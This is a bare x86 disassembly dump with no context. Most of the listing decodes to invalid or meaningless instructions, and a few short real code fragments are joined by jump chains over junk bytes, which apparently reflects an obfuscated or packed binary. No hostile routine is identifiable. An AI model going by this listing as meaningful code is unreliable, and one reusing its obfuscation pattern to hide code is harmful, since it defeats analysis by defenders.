  40c82d:	mov    ds:0x1cadbe5,al
  40c832:	shl    edx,0xd3
  40c835:	adc    edx,eax
  40c837:	out    0x7f,al
  40c839:	xchg   ebx,eax
  40c83a:	inc    eax
  40c83b:	test   eax,0xf5279a6d
  40c840:	aaa    
  40c841:	sub    ah,BYTE PTR [ebp+0x16044b14]
  40c847:	sub    ecx,eax
  40c849:	mov    ebp,0x6b05a615
  40c84e:	add    BYTE PTR [ecx+0x5abaa5cd],cl
  40c854:	push   eax
  40c855:	(bad)  
  40c856:	out    0xcf,eax
  40c858:	dec    edi
  40c859:	sub    al,BYTE PTR ds:0xa607a2d0
  40c85f:	mov    ah,0x8f
  40c861:	shr    BYTE PTR [ebx+eax*2+0x23eadf2e],cl
  40c868:	dec    ebp
  40c869:	adc    DWORD PTR [ecx+0x6e3d9a14],0x54766dc6
  40c873:	(bad)  
  40c874:	mov    ebx,0x90ae5dee
  40c879:	out    0xbc,eax
  40c87b:	pushf  
  40c87c:	push   edi
  40c87d:	aas    
  40c87e:	cmp    edx,DWORD PTR [eax+0x78]
  40c881:	pop    edi
  40c882:	or     eax,0xc873b0ee
  40c887:	xchg   ecx,eax
  40c888:	pop    esp
  40c889:	mov    esi,0x8b5ce925
  40c88e:	inc    ebp
  40c88f:	or     al,0x3
  40c891:	inc    ebp
  40c892:	or     BYTE PTR [ecx+0x458bf045],cl
  40c898:	in     al,0x85
  40c89a:	ror    BYTE PTR [edi],0x84
  40c89d:	jbe    0x40c8ad
  40c89f:	add    BYTE PTR [eax],al
  40c8a1:	mov    DWORD PTR [ebp-0x24],esi
  40c8a4:	push   0xb
  40c8a6:	pop    ecx
  40c8a7:	push   0x5
  40c8a9:	jmp    0x40ca07
  40c8ae:	stos   DWORD PTR es:[edi],eax
  40c8af:	xchg   DWORD PTR [eax-0x42c643da],ecx
  40c8b5:	fwait
  40c8b6:	adc    bh,bl
  40c8b8:	hlt    
  40c8b9:	call   0xf3f7:0xc9367b20
  40c8c0:	jle    0x40c940
  40c8c2:	aas    
  40c8c3:	jg     0x40c943
  40c8c5:	jle    0x40c916
  40c8c7:	es pop es
  40c8c9:	out    0x3f,al
  40c8cb:	or     esi,DWORD PTR [eax+0x9]
  40c8ce:	xchg   esi,eax
  40c8cf:	jbe    0x40c8fc
  40c8d1:	and    BYTE PTR [eax-0x73],0x5d
  40c8d5:	ds jmp 0x40c8be
  40c8d8:	fs arpl bp,dx
  40c8db:	bound  esi,QWORD PTR [ecx+0x35]
  40c8de:	into   
  40c8df:	add    edx,ebp
  40c8e1:	clc    
  40c8e2:	mov    BYTE PTR [ebx-0x3d65aa16],ch
  40c8e8:	adc    eax,0xca28345b
  40c8ed:	sbb    al,dh
  40c8ef:	xchg   ecx,eax
  40c8f0:	and    eax,0x3a994cca
  40c8f5:	into   
  40c8f6:	out    0x4,al
  40c8f8:	push   ss
  40c8f9:	std    
  40c8fa:	jne    0x1a78366d
  40c900:	adc    eax,0x4b1acec3
  40c905:	(bad)  
  40c906:	(bad)  
  40c908:	out    dx,eax
  40c909:	mov    ds:0x68eaf89c,eax
  40c90e:	pop    eax
  40c90f:	dec    ebp
  40c910:	fnstsw WORD PTR [ebp-0x3a]
  40c913:	into   
  40c914:	movzx  ebx,dh
  40c917:	(bad)  
  40c918:	mov    edx,0x7578f694
  40c91d:	loopne 0x40c8b7
  40c91f:	mov    ds:0xa8f30698,eax
  40c924:	sbb    DWORD PTR [esi+0x67],eax
  40c927:	popf   
  40c928:	mov    WORD PTR [edi+ebx*2+0x6a],?
  40c92c:	fild   QWORD PTR ds:0x947a5349
  40c932:	aam    0x94
  40c934:	nop
  40c935:	and    al,0x5a
  40c937:	push   ecx
  40c938:	stos   BYTE PTR es:[edi],al
  40c939:	inc    esi
  40c93a:	gs add al,0x7b
  40c93d:	retf   
  40c93e:	pop    esp
  40c93f:	sub    eax,0x988ec6fb
  40c944:	and    ecx,esp
  40c946:	mov    ds:0x9b4bc30b,eax
  40c94b:	les    ecx,FWORD PTR [ebp+0x1693fea1]
  40c951:	dec    ebp
  40c952:	and    eax,0xb20a02f3
  40c957:	nop
  40c958:	adc    cl,BYTE PTR cs:0x28f06b93
  40c95f:	or     BYTE PTR [ebx-0x722a841e],al
  40c965:	cld    
  40c966:	daa    
  40c967:	push   ebx
  40c968:	jmp    0x625b:0xef7d95e5
  40c96f:	dec    esi
  40c970:	pop    ss
  40c971:	das    
  40c972:	js     0x40c961
  40c974:	(bad)
  40c978:	mov    ch,0xc8
  40c97a:	fimul  DWORD PTR [esi]
  40c97c:	(bad)  
  40c97d:	leave  
  40c97e:	xchg   edx,eax
  40c97f:	dec    eax
  40c980:	retf   
  40c981:	mov    esp,0x33760b93
  40c986:	fisubr WORD PTR [eax+0x2e]
  40c989:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c98a:	jge    0x40c9c7
  40c98c:	jb     0x40c96c
  40c98e:	scas   eax,DWORD PTR es:[edi]
  40c98f:	push   edi
  40c990:	cmp    bh,BYTE PTR [ecx-0x7b7ac4ed]
  40c996:	gs mov bl,0x52
  40c999:	cmp    al,0x4b
  40c99b:	stos   DWORD PTR es:[edi],eax
  40c99c:	pop    ebx
  40c99d:	imul   esp,DWORD PTR [ebx-0x16],0xffffffbe
  40c9a1:	(bad)
  40c9a4:	stos   BYTE PTR es:[edi],al
  40c9a5:	sub    al,0x11
  40c9a7:	jnp    0x40c9c9
  40c9a9:	or     DWORD PTR [edx],esp
  40c9ab:	int3   
  40c9ac:	push   DWORD PTR [eax+eiz*4+0x304f6c4e]
  40c9b3:	mov    bl,0x81
  40c9b5:	mov    al,0xfc
  40c9b7:	mov    cl,0xca
  40c9b9:	mov    ecx,0x8bc0c82d
  40c9be:	addr16 pop esp
  40c9c0:	pop    eax
  40c9c1:	pop    edi
  40c9c2:	cmp    DWORD PTR [ebx-0x609222d1],esi
  40c9c8:	mov    ds:0x4038a8d6,eax
  40c9cd:	pop    esp
  40c9ce:	aam    0x86
  40c9d0:	xor    BYTE PTR ds:0x73aaa7f2,ch
  40c9d6:	je     0x40ca14
  40c9d8:	mov    eax,0xb23460df
  40c9dd:	adc    bl,BYTE PTR [edi]
  40c9df:	cwde   
  40c9e0:	push   esi
  40c9e1:	push   esi
  40c9e2:	daa    
  40c9e3:	inc    ebp
  40c9e4:	add    DWORD PTR [edi+0x32660e40],ecx
  40c9ea:	daa    
  40c9eb:	sub    dh,bl
  40c9ed:	jne    0x40c9fd
  40c9ef:	pop    edi
  40c9f0:	pop    esi
  40c9f1:	or     DWORD PTR [esi],0xffffffb1
  40c9f4:	(bad)  
  40c9f5:	scas   eax,DWORD PTR es:[edi]
  40c9f6:	nop
  40c9f7:	jg     0x40ca16
  40c9f9:	ficomp DWORD PTR [ecx-0x4c7d2569]
  40c9ff:	and    eax,0x4d7989a1
  40ca04:	out    0xc0,al
  40ca06:	dec    ecx
  40ca07:	dec    ecx
  40ca08:	jmp    0x40cb66
  40ca0d:	and    DWORD PTR [esi+eax*2+0x65fd5b1b],edx
  40ca14:	lods   al,BYTE PTR ds:[esi]
  40ca15:	retf   
  40ca16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca17:	sub    eax,0x3d3924cf
  40ca1c:	fmul   DWORD PTR [eax-0xc]
  40ca1f:	jle    0x40ca9f
  40ca21:	aas    
  40ca22:	jg     0x40caa2
  40ca24:	jle    0x40ca61
  40ca26:	add    DWORD PTR [ebp-0x6dd737c3],esp
  40ca2c:	jne    0x40ca3a
  40ca2e:	or     ebp,DWORD PTR cs:[ebp+0x22]
  40ca32:	adc    dl,0x11
  40ca35:	sbb    esi,DWORD PTR [ebp-0x54]
  40ca38:	add    dh,BYTE PTR [ebx+0xc747b43]
  40ca3e:	out    dx,eax
  40ca3f:	(bad)  
  40ca40:	fcomp  DWORD PTR [ebx-0x59]
  40ca43:	push   esp
  40ca44:	es popa 
  40ca46:	sahf   
  40ca47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca48:	push   0x3d
  40ca4a:	jns    0x40ca61
  40ca4c:	in     eax,dx
  40ca4d:	ins    BYTE PTR es:[edi],dx
  40ca4e:	adc    ah,BYTE PTR [edx+ebx*8]
  40ca51:	test   dl,bl
  40ca53:	ss dec edi
  40ca55:	xor    ebx,DWORD PTR [edi]
  40ca57:	(bad)  
  40ca58:	jae    0x40c9f7
  40ca5a:	hlt    
  40ca5b:	shl    DWORD PTR [ebx*1+0x1ca5646e],0xa5
  40ca63:	imul   eax,DWORD PTR [ebx+0x1e],0xff3da19b
  40ca6a:	mov    ds:0xeca259da,eax
  40ca6f:	iret   
  40ca70:	mov    ebp,0x65dbca75
  40ca75:	inc    esi
  40ca76:	(bad)  
  40ca77:	sbb    DWORD PTR [edx+eax*4],edx
  40ca7a:	dec    ecx
  40ca7b:	mov    edx,DWORD PTR [ecx-0x3b48f122]
  40ca81:	ins    BYTE PTR es:[edi],dx
  40ca82:	jl     0x40cafa
  40ca84:	test   DWORD PTR [ebx+eiz*8-0x1292ad91],esp
  40ca8b:	ins    WORD PTR es:[edi],dx
  40ca8d:	test   al,0x8f
  40ca8f:	add    bl,BYTE PTR [ecx-0x3b]
  40ca92:	fs mov bl,0x6c
  40ca95:	dec    edx
  40ca96:	sub    edi,edx
  40ca98:	cmc    
  40ca99:	push   0xfffffffb
  40ca9b:	push   ds
  40ca9c:	inc    esp
  40ca9d:	adc    eax,DWORD PTR [ebp+0x37]
  40caa0:	retf   
  40caa1:	mov    eax,0xa90206d6
  40caa6:	lods   al,BYTE PTR ds:[esi]
  40caa7:	out    0xdc,al
  40caa9:	push   cs
  40caaa:	out    dx,al
  40caab:	dec    esi
  40caac:	fisttp QWORD PTR [edi+0x743dc1ed]
  40cab3:	je     0x40ca7e
  40cab5:	jmp    0x40ca5b
  40cab7:	(bad)  
  40cab8:	sar    BYTE PTR [ecx-0x7b810a2f],1
  40cabe:	mov    bl,dl
  40cac0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cac1:	fild   QWORD PTR [eax]
  40cac3:	jne    0x40cac8
  40cac5:	xchg   ecx,eax
  40cac6:	outs   dx,BYTE PTR ds:[esi]
  40cac7:	mov    dl,0x4b
  40cac9:	mov    dh,0xef
  40cacb:	ror    bh,cl
  40cacd:	in     eax,0x4d
  40cacf:	xor    al,0x78
  40cad1:	dec    ebp
  40cad2:	xor    edi,DWORD PTR [eax-0x26]
  40cad5:	xchg   ebx,eax
  40cad6:	ret    0x75ed
  40cad9:	and    BYTE PTR [ebp+0x73b5eeb3],ch
  40cadf:	popf   
  40cae0:	and    bh,dh
  40cae2:	sbb    DWORD PTR [edi],0x77569327
  40cae8:	pushw  ds
  40caea:	mov    esi,0x128d0fec
  40caef:	or     al,0x71
  40caf1:	sub    al,0x1c
  40caf3:	dec    ebp
  40caf4:	add    DWORD PTR [ecx+0x6],esi
  40caf7:	sar    BYTE PTR [edx],1
  40caf9:	jnp    0x40cae3
  40cafb:	sbb    eax,0xfe768eb2
  40cb00:	sbb    eax,0xa14b204f
  40cb05:	fst    QWORD PTR [ecx+0x28]
  40cb08:	sub    ebx,DWORD PTR ds:0x8df22c6a
  40cb0e:	popf   
  40cb0f:	cmp    al,0x17
  40cb11:	mov    al,ds:0xc0f6f089
  40cb16:	xchg   edx,eax
  40cb17:	pop    eax
  40cb18:	mov    bl,0x15
  40cb1a:	sub    ebp,ecx
  40cb1c:	or     DWORD PTR [eax-0x7],0xffffffe7
  40cb20:	cmp    edx,DWORD PTR [edx+0x1a56a03c]
  40cb26:	inc    ebp
  40cb27:	rcr    DWORD PTR [ebx+0x8],0x8c
  40cb2b:	push   esp
  40cb2c:	or     al,0x63
  40cb2e:	shr    DWORD PTR [ebx],1
  40cb30:	stc    
  40cb31:	xchg   esp,eax
  40cb32:	stos   DWORD PTR es:[edi],eax
  40cb33:	inc    eax
  40cb34:	aas    
  40cb35:	cmovo  ecx,DWORD PTR [edx-0x11]
  40cb39:	fwait
  40cb3a:	iret   
  40cb3b:	sbb    dh,al
  40cb3d:	add    ecx,DWORD PTR [edi+0x5102803c]
  40cb43:	xchg   edi,eax
  40cb44:	(bad)  
  40cb45:	xchg   ebp,eax
  40cb46:	lds    edi,FWORD PTR [ebx]
  40cb48:	lock popa 
  40cb4a:	lea    ebx,[ebp-0x22ba3a2d]
  40cb50:	add    eax,0x1f6524ce
  40cb55:	fstp   DWORD PTR [ecx-0x42e37793]
  40cb5b:	popa   
  40cb5c:	sbb    al,0x5
  40cb5e:	xor    DWORD PTR [edi+ecx*4-0x51],ebp
  40cb62:	dec    ebx
  40cb63:	or     BYTE PTR [ebx-0x3478a452],ch
  40cb69:	sub    ebx,ecx
  40cb6b:	xchg   ebx,ecx
  40cb6d:	dec    ecx
  40cb6e:	mov    eax,DWORD PTR [ebp-0x1c]
  40cb71:	imul   eax,ecx
  40cb74:	sub    esp,eax
  40cb76:	mov    DWORD PTR [ebp-0x24],esp
  40cb79:	jmp    0x40ccd7
  40cb7e:	jp     0x40cb94
  40cb80:	rcr    eax,0x59
  40cb83:	std    
  40cb84:	jnp    0x40cb1a
  40cb86:	mov    BYTE PTR [ebp-0x29],ch
  40cb89:	jl     0x40cbe1
  40cb8b:	add    edi,DWORD PTR [ebx]
  40cb8d:	retf   0xf609
  40cb90:	jle    0x40cc10
  40cb92:	aas    
  40cb93:	jg     0x40cc13
  40cb95:	jle    0x40cb28
  40cb97:	mov    esi,0x164e97d2
  40cb9c:	mov    ecx,0x43f6a4db
  40cba1:	pushf  
  40cba2:	ss push ecx
  40cba4:	xchg   ebp,ebx
  40cba6:	rol    DWORD PTR [edi+ecx*4-0x562d9ce9],0x7e
  40cbae:	cmovle edi,ebx
  40cbb1:	mov    esi,?
  40cbb3:	xchg   esp,eax
  40cbb4:	or     al,0x43
  40cbb6:	out    0x6,eax
  40cbb8:	aam    0x9e
  40cbba:	(bad)  
  40cbbc:	arpl   WORD PTR [ebx-0x1f36fedc],sp
  40cbc2:	rcr    ch,0x71
  40cbc5:	in     al,0x27
  40cbc7:	stos   BYTE PTR es:[edi],al
  40cbc8:	sbb    eax,0x9ad9beb2
  40cbcd:	jb     0x40cb57
  40cbcf:	mov    ds:0x86d9c267,eax
  40cbd4:	adc    eax,0x86f70d5d
  40cbd9:	cmc    
  40cbda:	adc    al,0x43
  40cbdc:	ds fwait
  40cbde:	xchg   ebp,eax
  40cbdf:	cwde   
  40cbe0:	cwde   
  40cbe1:	jmp    0xf477:0x1e441f9
  40cbe8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbe9:	push   ds
  40cbea:	and    eax,0x9b224b5b
  40cbef:	test   eax,0x1f86e20a
  40cbf4:	ins    BYTE PTR es:[edi],dx
  40cbf5:	mov    ebp,0xfa91d42d
  40cbfa:	mov    ah,BYTE PTR [ecx+ecx*8-0x63cedf39]
  40cc01:	(bad)  
  40cc02:	jbe    0x40cbb3
  40cc04:	ds push edx
  40cc06:	jne    0x40cbdb
  40cc08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc09:	adc    BYTE PTR [ecx-0x2e59a1cb],ah
  40cc0f:	sub    eax,ecx
  40cc11:	mov    BYTE PTR [edx],ah
  40cc13:	pushf  
  40cc14:	aam    0xb0
  40cc16:	push   0xb8d79859
  40cc1b:	sar    dl,cl
  40cc1d:	xor    edx,esi
  40cc1f:	mov    esp,0x13970ca2
  40cc24:	cmp    esi,DWORD PTR [esi*1+0x6cf0da8c]
  40cc2b:	imul   esp,ebp,0xffffffac
  40cc2e:	add    edi,DWORD PTR [edx+0x55]
  40cc31:	fstp   DWORD PTR [esp+esi*2]
  40cc34:	aad    0x75
  40cc36:	iret   
  40cc37:	adc    DWORD PTR [ebx+esi*8+0x3f0c8577],edi
  40cc3e:	inc    esp
  40cc3f:	add    ah,ch
  40cc41:	push   eax
  40cc42:	xlat   BYTE PTR ds:[ebx]
  40cc43:	cli    
  40cc44:	cmp    al,0x4
  40cc46:	fimul  DWORD PTR [edi+0x7955e6d5]
  40cc4c:	pop    esi
  40cc4d:	mul    BYTE PTR es:[esi]
  40cc50:	mov    ebp,0x36d496e6
  40cc55:	arpl   WORD PTR [eax],sp
  40cc57:	std    
  40cc58:	rcr    BYTE PTR [eax+0x4267b44d],1
  40cc5e:	imul   eax,DWORD PTR [ecx+0x6337ec61],0x2d288d14
  40cc68:	mov    BYTE PTR [ecx],bh
  40cc6a:	stos   DWORD PTR es:[edi],eax
  40cc6b:	pop    es
  40cc6c:	ficom  WORD PTR ds:0x30955b65
  40cc72:	jnp    0x40cc67
  40cc74:	cmp    esp,DWORD PTR [ebx+0x27]
  40cc77:	inc    edx
  40cc78:	fiadd  WORD PTR [ebx]
  40cc7a:	push   ecx
  40cc7b:	push   esi
  40cc7c:	sub    DWORD PTR [ecx],0x6a
  40cc7f:	jp     0x40cc6b
  40cc81:	mov    ah,0xe3
  40cc83:	push   0xffffff83
  40cc85:	xor    BYTE PTR [eax],dh
  40cc87:	inc    edx
  40cc88:	or     bh,ch
  40cc8a:	add    eax,0x832c6a7a
  40cc8f:	and    ah,bl
  40cc91:	cdq    
  40cc92:	cs call 0xd44c548e
  40cc98:	fiadd  DWORD PTR [edx+ebp*2-0x80]
  40cc9c:	pop    ebp
  40cc9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc9e:	xchg   edx,eax
  40cc9f:	fdiv   QWORD PTR [edi+0x62]
  40cca2:	mov    ah,bh
  40cca4:	in     al,0xb8
  40cca6:	call   0x9b9a:0xe34e1660
  40ccad:	(bad)  
  40ccae:	out    dx,al
  40ccaf:	sbb    BYTE PTR [eax+0x4f],bl
  40ccb2:	adc    cl,BYTE PTR [edx-0x1de811b1]
  40ccb8:	(bad)  
  40ccb9:	out    0x67,eax
  40ccbb:	out    0x79,al
  40ccbd:	pop    eax
  40ccbe:	pop    es
  40ccbf:	retf   
  40ccc0:	push   edx
  40ccc1:	adc    BYTE PTR [ebp+0x73],ah
  40ccc4:	pop    eax
  40ccc5:	aad    0x11
  40ccc7:	(bad)  
  40ccc8:	popa   
  40ccc9:	push   ebx
  40ccca:	sbb    al,0xc
  40cccc:	mov    WORD PTR [eax-0x20],gs
  40cccf:	xchg   edi,eax
  40ccd0:	aas    
  40ccd1:	cmp    DWORD PTR ss:[esi+eax*1+0x458bd023],0x856b9fc
  40ccdd:	push   ecx
  40ccde:	pop    es
  40ccdf:	jmp    0x40ce3d
  40cce4:	test   DWORD PTR [ebx+0x4e],esi
  40cce7:	test   al,0x40
  40cce9:	jge    0x40cd68
  40cceb:	cmp    edi,DWORD PTR ds:0x64ec1d3a
  40ccf1:	(bad)  
  40ccf2:	hlt    
  40ccf3:	add    ecx,edx
  40ccf5:	idiv   DWORD PTR [esi+0x7e]
  40ccf8:	aas    
  40ccf9:	jg     0x40cd79
  40ccfb:	jle    0x40cd3a
  40ccfd:	ds jge 0x40cd6f
  40cd00:	test   BYTE PTR [edx+ebp*8-0x10e71761],ah
  40cd07:	rep outs dx,BYTE PTR ds:[esi]
  40cd09:	cmp    dl,dl
  40cd0b:	sbb    BYTE PTR [esi-0x43],0x9a
  40cd0f:	push   esi
  40cd10:	aad    0xf8
  40cd12:	int    0x1a
  40cd14:	or     DWORD PTR [ecx-0x6254025e],eax
  40cd1a:	loop   0x40cd97
  40cd1c:	push   ebp
  40cd1d:	gs ror bh,0xca
  40cd21:	xchg   ebx,eax
  40cd22:	shl    BYTE PTR [bx+si-0x4095],1
  40cd27:	and    al,0xd2
  40cd29:	inc    esi
  40cd2a:	add    eax,0x80eaa8e0
  40cd2f:	jnp    0x40cd57
  40cd31:	adc    edx,DWORD PTR [esi]
  40cd33:	fcomp  DWORD PTR [esi+edx*4-0x6a]
  40cd37:	test   BYTE PTR ds:0x97dabe51,bl
  40cd3d:	add    WORD PTR [ebp+ecx*1+0x5f],si
  40cd42:	jnp    0x40cd6d
  40cd44:	or     ah,BYTE PTR [ecx]
  40cd46:	mov    BYTE PTR [ecx],dh
  40cd48:	popa   
  40cd49:	jbe    0x40cdaa
  40cd4b:	mov    ebx,0xc38c5dfd
  40cd50:	xchg   DWORD PTR [ebp+0x2afa53e7],ebx
  40cd56:	ret    
  40cd57:	xchg   esi,eax
  40cd58:	cld    
  40cd59:	repz ja 0x40cd25
  40cd5c:	int    0x76
  40cd5e:	and    bl,BYTE PTR [edi-0x68]
  40cd61:	mov    BYTE PTR [eax-0x5a535be3],al
  40cd67:	mov    esp,0x787dfde1
  40cd6c:	mov    eax,0xbf6f2659
  40cd71:	dec    esp
  40cd72:	ficomp WORD PTR [ebp+0x13]
  40cd75:	mov    bl,0x16
  40cd77:	xchg   ecx,eax
  40cd78:	into   
  40cd79:	add    eax,0x8dc15595
  40cd7e:	stos   DWORD PTR es:[edi],eax
  40cd7f:	or     DWORD PTR [edx],ebx
  40cd81:	in     eax,0x56
  40cd83:	imul   ebx,DWORD PTR [edi],0xffffffc0
  40cd86:	js     0x40cd6a
  40cd88:	jge    0x40cd69
  40cd8a:	neg    bh
  40cd8c:	add    esi,edi
  40cd8e:	xchg   edx,eax
  40cd8f:	push   edx
  40cd90:	fstp   TBYTE PTR [ebx+eax*2]
  40cd93:	cmp    ch,BYTE PTR [edi]
  40cd95:	(bad)  
  40cd96:	int    0x9e
  40cd98:	stos   DWORD PTR es:[edi],eax
  40cd99:	(bad)  [eax+0x7d]
  40cd9c:	icebp  
  40cd9d:	aas    
  40cd9e:	fild   QWORD PTR [edi-0x7e6ced22]
  40cda4:	and    al,0x5c
  40cda6:	ret    0x674d
  40cda9:	and    bl,BYTE PTR [ebx]
  40cdab:	cmp    BYTE PTR [edi-0x64],al
  40cdae:	(bad)  
  40cdaf:	je     0x40cd4f
  40cdb1:	mov    ds:0x93b3f859,eax
  40cdb6:	cmp    eax,0x58d16ba7
  40cdbb:	aam    0xa4
  40cdbd:	sahf   
  40cdbe:	fcomip st,st(5)
  40cdc0:	sub    esp,DWORD PTR [ebx-0x29e1a212]
  40cdc6:	and    DWORD PTR ds:0xcf2e117e,0x8b98005b
  40cdd0:	loope  0x40cddc
  40cdd2:	sbb    edx,DWORD PTR [eax-0x40]
  40cdd5:	or     edx,DWORD PTR [esi+0x102b78d4]
  40cddb:	dec    edi
  40cddc:	cli    
  40cddd:	push   edi
  40cdde:	xor    al,0x6a
  40cde0:	xor    esp,DWORD PTR [edi-0x1c]
  40cde3:	fdivr  QWORD PTR [ebp-0x4085d262]
  40cde9:	sbb    DWORD PTR [ecx+0x44],eax
  40cdec:	cmp    dl,dh
  40cdee:	dec    eax
  40cdef:	out    0x91,eax
  40cdf1:	jmp    0x40cd96
  40cdf3:	bnd jno 0x40cddf
  40cdf6:	cmp    bh,BYTE PTR [ebx]
  40cdf8:	repz dec eax
  40cdfa:	test   BYTE PTR [eax+0x6e],dh
  40cdfd:	cmp    esi,DWORD PTR [ecx-0x7a]
  40ce00:	(bad)  
  40ce01:	pop    esp
  40ce02:	or     BYTE PTR ds:0xe3681881,dh
  40ce08:	or     al,0xf1
  40ce0a:	mov    ds:0xc1152b0d,al
  40ce0f:	inc    ebp
  40ce10:	inc    eax
  40ce11:	push   esp
  40ce12:	inc    ecx
  40ce13:	mov    esi,0xb89035fb
  40ce18:	popf   
  40ce19:	adc    eax,0x758a10aa
  40ce1e:	jbe    0x40cdf3
  40ce20:	mov    eax,0x50bc545f
  40ce25:	adc    eax,0x33bc3ee9
  40ce2a:	sbb    cl,cl
  40ce2c:	scas   eax,DWORD PTR es:[edi]
  40ce2d:	jb     0x40ce04
  40ce2f:	mov    al,ds:0x7d89e216
  40ce34:	clc    
  40ce35:	fist   WORD PTR [ebp-0x59aac9ae]
  40ce3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce3c:	push   ebp
  40ce3d:	xor    eax,ecx
  40ce3f:	mov    edx,0x32729d
  40ce44:	add    eax,edx
  40ce46:	jmp    0x40cfa4
  40ce4b:	mov    dl,0xd7
  40ce4d:	or     al,0x5b
  40ce4f:	lods   eax,DWORD PTR ds:[esi]
  40ce50:	jge    0x40ce97
  40ce52:	out    0xb5,eax
  40ce54:	mov    ds:0x96955331,eax
  40ce59:	add    cl,BYTE PTR ds:[ebx+0x3f7e7e88]
  40ce60:	jg     0x40cee0
  40ce62:	jle    0x40ced5
  40ce64:	repnz pop esp
  40ce66:	out    0xcd,al
  40ce68:	call   DWORD PTR [ebx-0x937d2f7]
  40ce6e:	loope  0x40ce94
  40ce70:	addr16 sbb ebp,esp
  40ce73:	std    
  40ce74:	xor    BYTE PTR [edx-0x1f871ce],ah
  40ce7a:	adc    dh,BYTE PTR [edi-0x43]
  40ce7d:	mov    edi,0xd47a1eb1
  40ce82:	jle    0x40cf02
  40ce84:	jnp    0x40ce49
  40ce86:	nop
  40ce87:	lahf   
  40ce88:	mov    ch,BYTE PTR [edi]
  40ce8a:	ins    BYTE PTR es:[edi],dx
  40ce8b:	adc    bl,ah
  40ce8d:	lahf   
  40ce8e:	pop    edx
  40ce8f:	je     0x40cefa
  40ce91:	mov    al,BYTE PTR [eax+eax*8+0x5870b78f]
  40ce98:	push   esi
  40ce99:	sbb    eax,0x9336d39f
  40ce9e:	std    
  40ce9f:	retf   0xbe2f
  40cea2:	cs icebp 
  40cea4:	(bad)  
  40cea5:	aad    0xa2
  40cea7:	outs   dx,BYTE PTR ds:[esi]
  40cea8:	sbb    al,0x65
  40ceaa:	std    
  40ceab:	test   al,0xed
  40cead:	or     ebx,DWORD PTR [esi]
  40ceaf:	inc    edx
  40ceb0:	sbb    dl,BYTE PTR [ebx]
  40ceb2:	xor    eax,0x72889800
  40ceb7:	gs pusha 
  40ceb9:	jl     0x40ce5c
  40cebb:	(bad)  [edi]
  40cebd:	push   0xf9133353
  40cec2:	mov    ch,0x80
  40cec4:	dec    edx
  40cec5:	out    0xfd,eax
  40cec7:	mov    BYTE PTR [ebx-0x4c],dh
  40ceca:	outs   dx,BYTE PTR ds:[esi]
  40cecb:	jp     0x40ce56
  40cecd:	sbb    esp,DWORD PTR [ebx+0x63]
  40ced0:	cmc    
  40ced1:	jne    0x40cf3a
  40ced3:	scas   eax,DWORD PTR es:[edi]
  40ced4:	adc    ebp,DWORD PTR [edx]
  40ced6:	mov    ah,0x1
  40ced8:	lds    ebx,FWORD PTR [ecx-0x4b9fd01f]
  40cede:	popf   
  40cedf:	and    eax,0xa97329a9
  40cee4:	push   0x79d40d4e
  40cee9:	retf   
  40ceea:	jecxz  0x40cf0c
  40ceec:	pop    edx
  40ceed:	addr16 clc 
  40ceef:	mov    BYTE PTR [esi-0x40a4b540],bh
  40cef5:	mov    edx,0x29bed6ba
  40cefa:	outs   dx,DWORD PTR ds:[esi]
  40cefb:	in     al,0xa7
  40cefd:	push   eax
  40cefe:	adc    al,0xfb
  40cf00:	pop    ebx
  40cf01:	adc    eax,0xa92d5a3c
  40cf06:	in     al,dx
  40cf07:	mov    ebx,0xff59950e
  40cf0c:	and    DWORD PTR [ebp-0x50ccc7a0],ebx
  40cf12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf13:	and    al,0x1c
  40cf15:	repnz adc eax,0xcf9c7684
  40cf1b:	cld    
  40cf1c:	arpl   WORD PTR [edi],bp
  40cf1e:	test   DWORD PTR [ebx-0x4d75009b],ebp
  40cf24:	push   cs
  40cf25:	call   0x254917c1
  40cf2a:	fild   WORD PTR ds:0x20173c15
  40cf30:	add    eax,0x7fc46c16
  40cf35:	add    ah,BYTE PTR cs:[edx-0x4a74b3a3]
  40cf3c:	mov    ebp,0x8cf43a30
  40cf41:	daa    
  40cf42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf43:	jae    0x40cf22
  40cf45:	mov    eax,0x5360e1af
  40cf4a:	push   ebx
  40cf4b:	mov    eax,ds:0x6441321b
  40cf50:	adc    BYTE PTR [ecx+edi*4-0x7cf0b6d],dl
  40cf57:	xchg   DWORD PTR [edi-0x32156b4b],ebx
  40cf5d:	xchg   esi,eax
  40cf5e:	dec    esi
  40cf5f:	aad    0xfb
  40cf61:	call   0x3460:0x643ed49b
  40cf68:	xor    DWORD PTR [ebx+eax*8],esi
  40cf6b:	jg     0x40cf74
  40cf6d:	cld    
  40cf6e:	jmp    0x40cef9
  40cf70:	aas    
  40cf71:	xchg   esi,eax
  40cf72:	cmp    eax,DWORD PTR [ebx-0x28d466ea]
  40cf78:	iret   
  40cf79:	push   edx
  40cf7a:	rol    bl,cl
  40cf7c:	ja     0x40cfc2
  40cf7e:	enter  0xdff0,0xc9
  40cf82:	in     al,0xfd
  40cf84:	pop    eax
  40cf85:	mov    eax,ds:0x3b34e19b
  40cf8a:	pop    ecx
  40cf8b:	das    
  40cf8c:	out    0xc5,eax
  40cf8e:	aaa    
  40cf8f:	mov    esi,0x9dd40b2b
  40cf94:	and    bh,BYTE PTR [eax]
  40cf96:	ds push esp
  40cf98:	in     eax,dx
  40cf99:	out    0x8,al
  40cf9b:	cs pusha 
  40cf9d:	add    esp,ebp
  40cf9f:	repnz push 0xffffffd9
  40cfa2:	dec    esp
  40cfa3:	in     eax,dx
  40cfa4:	mov    DWORD PTR [ebp+0x8],eax
  40cfa7:	mov    eax,DWORD PTR [ebp-0x18]
  40cfaa:	xor    eax,ecx
  40cfac:	add    eax,edx
  40cfae:	mov    edx,DWORD PTR [ebp+0x14]
  40cfb1:	imul   eax,DWORD PTR [edx]
  40cfb4:	mov    edx,DWORD PTR [ebp-0x4]
  40cfb7:	jmp    0x40d115
  40cfbc:	inc    bx
  40cfbe:	sbb    BYTE PTR [ebx+0x7b7d4d3d],dh
  40cfc4:	gs pop ss
  40cfc6:	jae    0x40cf71
